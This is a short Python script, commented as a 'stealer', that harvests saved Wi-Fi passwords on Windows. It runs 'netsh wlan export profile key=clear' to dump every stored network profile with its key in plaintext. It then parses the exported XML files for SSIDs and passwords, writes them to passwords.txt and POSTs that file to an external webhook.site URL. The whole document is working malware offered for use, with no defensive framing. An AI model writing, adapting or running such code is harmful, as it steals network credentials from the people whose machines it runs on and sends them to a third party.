import subprocess
import os
import sys
import requests

#stealer URL
url = 'https://webhook.site/ae91b194-1d51-4fa2-b641-1f0843d1e9f2'



#Create a file
pasword_file = open('passwords.txt', "w")
pasword_file.write("Hello Davy! Here are your passwords:\n\n")
pasword_file.close()

#Lists
wifi_files = []
wifi_name = []
wifi_password = []

#Use Python to execute a Windows command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout

#Grab current directory
path = os.getcwd()


#Do the hackies
for filename in os.listdir(path):
    if filename.startswith("WLAN") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r', encoding='utf-8') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("passwords.txt", "a")
                            print("SSID: "+x, "Password: "+y, sep='\n')
                            sys.stdout.close()
        
        
#Send the hackies
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)
        
        
        
        
        
        
        
        
        
        
        


